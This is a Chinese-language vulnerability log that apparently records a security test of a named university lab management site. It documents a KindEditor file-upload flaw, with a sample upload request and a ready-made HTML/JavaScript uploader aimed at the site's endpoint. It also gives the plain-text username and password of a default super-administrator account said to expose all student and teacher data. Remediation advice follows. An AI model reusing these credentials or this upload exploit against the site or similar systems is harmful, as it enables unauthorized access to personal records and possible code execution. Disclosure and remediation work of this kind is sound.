### 漏洞发现日志

---

**日期**: 2023年10月1日  
**时间**: 14:30  
**记录者**: 薛谔  
**目标网站**: 实验室综合管理与服务平台-登录界面

https://mdsysgl.mdit.edu.cn/sysgl/ 

---

#### 1. 漏洞发现概述
- **漏洞类型**: 
  - KindEditor 文件上传漏洞
  - 默认管理员账户漏洞
- **漏洞影响**: 
  - KindEditor漏洞允许上传指定类型的文件，可能导致远程代码执行和数据泄露。
  - 默认管理员账户漏洞允许攻击者使用默认凭据登录，可能导致未授权访问和数据泄露。
- **漏洞严重性**: 高（CVSS评分待定）

---

#### 2. 漏洞发现过程
- **测试环境**: 使用浏览器进行手动测试。
- **发现方法**: 
  - 通过访问 KindEditor 的文件上传功能进行测试。
  - 直接访问登录页面并尝试使用默认凭据进行登录。

---

#### 3. 漏洞详细信息

##### 3.1 KindEditor 文件上传漏洞
- **测试步骤**:
  - **14:35**: 访问登录页面 [实验室综合管理与服务平台-登录界面](https://mdsysgl.mdit.edu.cn/sysgl/)。
  - **14:36**: 登录成功后，访问文件上传功能测试地址 [KindEditor 示例](https://mdsysgl.mdit.edu.cn/sysgl/static/plugins/kindeditor-4.1.2/jsp/demo.jsp)。
  - **14:37**: 尝试上传指定类型的文件（如 `.doc`, `.docx`, `.xls`, `.xlsx`, `.ppt`, `.htm`, `.html`, `.txt`, `.zip`, `.rar`, `.gz`, `.bz`）。
  - **14:38**: 观察到系统未能正确验证文件内容，成功上传包含恶意代码的文件。

- **漏洞地址**: [https://mdsysgl.mdit.edu.cn/sysgl/index/login_toIndex](https://mdsysgl.mdit.edu.cn/sysgl/index/login_toIndex)
- **允许上传的文件类型**: 
  - doc
  - docx
  - xls
  - xlsx
  - ppt
  - htm
  - html
  - txt
  - zip
  - rar
  - gz
  - bz

- **示例请求**: 
  ```http
  POST /sysgl/static/plugins/kindeditor-4.1.2/jsp/upload_json.jsp?dir=file HTTP/1.1
  Host: mdsysgl.mdit.edu.cn
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
  
  ------WebKitFormBoundary
  Content-Disposition: form-data; name="imgFile"; filename="malicious.doc"
  Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
  
  [恶意代码内容]
  ------WebKitFormBoundary--
  ```

##### 3.2 默认管理员账户漏洞
- **测试步骤**:
  - **14:40**: 访问登录页面 [实验室综合管理与服务平台-登录界面](https://mdsysgl.mdit.edu.cn/sysgl/)。
  - **14:41**: 输入默认管理员账户和密码：
    - **账号**: `000000`
    - **密码**: `Admin@123`
  - **14:42**: 成功登录，发现该账户为超级管理员，能够查看所有学生和老师的信息，并修改成员密码。

- **漏洞地址**: [https://mdsysgl.mdit.edu.cn/sysgl/](https://mdsysgl.mdit.edu.cn/sysgl/)
- **影响范围**: 所有用户信息，包括学生和老师的个人信息。

---

#### 4. 影响评估
- **受影响的用户**: 所有注册用户和系统管理员。
- **潜在损失**: 数据泄露、未授权访问和可能的法律责任。

---

#### 5. 修复建议
- **短期修复**: 
  - 对于KindEditor漏洞，立即对文件上传功能进行安全性检查，限制可上传文件类型，并对文件内容进行验证。
  - 对于默认管理员账户漏洞，立即禁用默认管理员账户，并强制要求所有用户更改密码。
- **长期修复**: 
  - 实施文件上传的严格验证和过滤机制，确保只允许安全的文件类型，并对文件内容进行扫描。
  - 实施强密码策略，确保所有账户使用唯一且复杂的密码。
- **安全最佳实践**: 定期进行安全审计，检查默认凭据的使用情况，并及时更新系统。

---

### 上传代码示例

以下是用于上传文件的 HTML 和 JavaScript 代码示例：

```html
html<html>
<head>
    <title>Uploader</title>
    <script src="https://mdsysgl.mdit.edu.cn/sysgl/static/plugins/kindeditor-4.1.2/kindeditor.js"></script>
    <script>
        KindEditor.ready(function (K) {
            var uploadbutton = K.uploadbutton({
                button: K('#uploadButton')[0],
                fieldName: 'imgFile',
                url: 'https://mdsysgl.mdit.edu.cn/sysgl/static/plugins/kindeditor-4.1.2/jsp/upload_json.jsp?dir=file',
                afterUpload: function (data) {
                    if (data.error === 0) {
                        var url = K.formatUrl(data.url, 'absolute');
                        K('#url').val(url);
                    }
                },
            });

            uploadbutton.fileBox.change(function (e) {
                uploadbutton.submit();
            });
        });
    </script>
</head>
<body>
<div class="upload">
    <input class="ke-input-text" type="text" id="url" value="" readonly="readonly"/>
    <input type="button" id="uploadButton" value="Upload"/>
</div>
</body>
</html>
```